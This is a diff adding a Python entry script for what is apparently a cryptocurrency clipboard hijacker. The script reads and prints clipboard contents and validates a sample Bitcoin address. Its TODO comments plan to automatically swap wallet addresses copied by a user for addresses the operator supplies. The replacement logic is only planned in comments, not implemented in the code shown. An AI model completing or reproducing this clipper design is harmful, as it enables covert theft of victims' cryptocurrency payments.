@@ -1,0 +1,21 @@
+from controller.clipboard_controller import ClipboardController
+
+
+#TODO ENTER_YOUR_CRYPTOS
+#TODO GET FEEDBACK FROM MVC
+
+ClipboardController = ClipboardController()
+
+if __name__ == "__main__":
+    ClipboardController.print_clipboard_content()                                               #FIXME -----------------------------
+    print("======================================================")                             #FIXME          Added this
+    print("Clipboard was printed above for debug purposes! Will be removed in next versions.")  #FIXME      for debug purposes
+    print("======================================================")                             #FIXME -----------------------------
+
+    print(ClipboardController.check_wallet_format("3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"))
+
+    #TODO enter your addres, leave blank if you don't want to use this one
+    #TODO repeat step from above X times, depending on currency(-ies) you want to sue
+    #TODO automatically check what type of address user entered and inform him about his choice
+    #TODO automatically replace address in clipboard using corresponding replacement address, if available
+    #TODO if there are addresses for same currency but of different type - use first available
